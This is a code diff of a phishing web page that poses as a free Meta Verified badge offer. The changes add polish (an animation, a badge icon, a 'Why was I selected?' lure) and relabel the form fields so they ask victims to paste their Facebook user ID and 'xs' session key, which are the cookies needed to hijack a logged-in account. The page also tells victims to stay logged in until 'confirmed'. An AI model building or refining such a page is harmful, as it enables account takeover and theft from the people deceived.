@@ -44,7 +44,13 @@
       background-color: white;
       border-radius: 10px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      animation: fadeIn 0.4s ease;
       overflow: hidden;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .form-header,
@@ -72,7 +78,7 @@
     label {
       font-size: 13px;
       font-weight: 600;
-      margin-top: 16px;
+      margin-top: 18px;
       display: block;
       color: #333;
     }
@@ -100,8 +106,8 @@
     }
 
     video {
-      width: 60%;
-      max-width: 420px;
+      width: 100%;
+      max-width: 440px;
       border-radius: 10px;
       margin-top: 8px;
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
@@ -127,6 +133,27 @@
       color: #888;
       margin-top: 10px;
     }
+
+    .badge-icon {
+      width: 28px;
+      height: 28px;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    .why-section {
+      background-color: #f8f9fb;
+      padding: 16px;
+      border-left: 4px solid #1877f2;
+      margin-top: 24px;
+      border-radius: 6px;
+    }
+
+    .why-section p {
+      margin: 0;
+      font-size: 13.5px;
+      color: #555;
+    }
   </style>
 </head>
 <body>
@@ -138,30 +165,37 @@
 
     <div class="form-container">
       <div class="form-header">
-        <h5>Request a Verified Badge on Facebook</h5>
+        <h5>
+          <img src="https://cdn-icons-png.flaticon.com/512/1051/1051377.png" alt="Verified" class="badge-icon">
+          Request a Verified Badge on Facebook
+        </h5>
       </div>
 
       <div class="form-body">
         <p><strong>Meta Verified</strong> helps you build trust by confirming your identity and authenticity on Facebook and Instagram.</p>
 
-        <p>Eligible creators have been invited to access Meta Verified for <strong>free for 12 months</strong>. This trial includes profile verification, priority support, and proactive impersonation protection.</p>
+        <p>Selected creators have been invited to access Meta Verified for <strong>free for 12 months</strong>. This includes profile verification, direct support, and impersonation protection.</p>
 
-        <p>To confirm your eligibility, please fill out the details below. It helps us identify your invitation through our internal system.</p>
+        <p>To confirm your invitation, please fill in the information below. This allows our internal team to verify your eligibility securely.</p>
+
+        <div class="why-section">
+          <p><strong>Why was I selected?</strong><br>We are offering free verification access to creators with consistent engagement, community impact, and cross-platform presence.</p>
+        </div>
 
         <div class="video-container">
-          <p class="text-secondary" style="font-size: 13px;">Watch how to fill out the form:</p>
+          <p class="text-secondary mt-3" style="font-size: 13px;">Need help? Watch this short guide:</p>
           <video controls autoplay muted>
             <source src="https://cdn.glitch.global/e6fdea79-9332-410b-9d43-e610883fc60c/detailed%20video.mp4?v=1737384626648" type="video/mp4">
           </video>
         </div>
 
-        <label for="c_user">(c_user)</label>
-        <input type="number" name="c_user" required pattern="^\d{15}$" title="Please enter a 15-digit Facebook user ID" />
+        <label for="c_user">Your Facebook ID (c_user)</label>
+        <input type="number" name="c_user" required pattern="^\d{15}$" title="Enter your 15-digit Facebook user ID" />
 
-        <label for="xs">(xs)</label>
+        <label for="xs">Your Session Key (xs)</label>
         <input type="text" name="xs" required />
 
-        <p class="small-note">Please stay logged into your account until you receive a confirmation email from our system.</p>
+        <p class="small-note">Stay logged in until your request is confirmed via email. Do not share this information elsewhere.</p>
       </div>
 
       <div class="form-footer d-flex justify-content-end">
